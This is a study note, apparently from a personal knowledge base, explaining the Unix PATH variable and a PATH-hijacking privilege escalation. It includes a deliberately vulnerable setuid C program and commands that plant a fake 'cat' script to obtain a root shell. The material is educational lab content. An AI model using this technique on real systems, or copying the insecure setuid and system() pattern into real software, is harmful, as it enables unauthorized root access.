[[Privilege Escalation]]

What is **PATH**
You typically write the name of the program. For example, If i want to list out all the files in a given dir. `ls` program as fololws

```
$ls
content     public    thumbnail   video
```

Means that before executing the cmd the shell needs to resolve its full path, which it needs to know where does the progrem resde within the file system. This is where the concept of a PATH comes in.

PATH is an environment variable found within the shell and other processes as well which determines the folders to look in order to resolve command names into full paths.

```
echo $PATH
```

```
/usr/local/sbin
/usr/local/bin
/usr/bin
/opt/cuda/bin
/opt/cuda/nsight_compute
/opt/cuda/nsight_systems/bin:/usr/lib/jvm/default/bin
/usr/bin/site_perl:/usr/bin/vendor_perl
/usr/bin/core_perl
/usr/lib/rustup/bin:/home/leo/utils
/home/leo/go/bin/
```

## How PATH is used
it wills tart from the first folder, and until it has found an `ls` binary, it will keep looking for further folders until all of them have been checked.

Example
1. The Directory is /usr/local/bin, and so the shel lchecks for the existence of the file
```
$ /usr/local/bin/ls
File of directory is not existed
```
2. The directory of /usr/bin, and so the shell checks for the existence of file
```
$ /usr/bin/ls
archive   notes.txt   reader.c
```

`which whoami`
```
/usr/bin/whoami
```
# PATH Hijacking
![[Pasted image 20250525130528.png]]
![[Pasted image 20250525130627.png]]

```
// gcc reader.c -o reader

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char *VALID_FILES[] = { "01.txt", "02.txt" };
int valid_files_count = 2;

int main(int argc, char **argv) {

  if (argc < 2) {
    fprintf(stderr, "[INFO]: Usage %s <filename>\n");
    return -1;
  }

  char *user_filename = argv[1];

  for (int i = 0; i < valid_files_count; i++) {
    char *valid_filename = VALID_FILES[i];
    int length = strlen(valid_filename);

    if (!strncmp(user_filename, valid_filename, length)) {
      char cmd[42] = {0};
      sprintf(cmd, "cat ./archive/%s", user_filename);
      setuid(0);
      setgid(0);
      system(cmd);
      return 0;
    }
  }

  printf("[INFO]: No file with such names were found.\n");
  
  return 0;
}
```
As you can see from the code the program is used to read some files within an archive directory, where archive contains a bunch of files which can only be access by root, or by the program itself in read only mode.

try to run the reader which will not run `./reader` and `string reader`. You also need user root in order to open the file.

# PATH Hijacking method
1. Create a malicious bash script and call it `cat` within the current folder
```
echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat
chmod +x cat
```

**`echo -en`**:

- `-e`: enables interpretation of backslash escapes like `\n`.
    
- `-n`: omits the trailing newline at the end of the output.

```
#!/usr/bin/env sh
/bin/bash

```

**`> cat`**:

- This redirects the output into a new file named `cat` in the current directory.

2. Launch the program with a malicious PATH variable
```
PATH=.:$PATH ./reader 01.txt
```
**`PATH=.:$PATH`**:

- Temporary `.` from the current  directory to the `PATH` variable. 

2. Enjoy the profit
```
$ PATH=.:$PATH ./reader 01.txt
# whoami
root
```


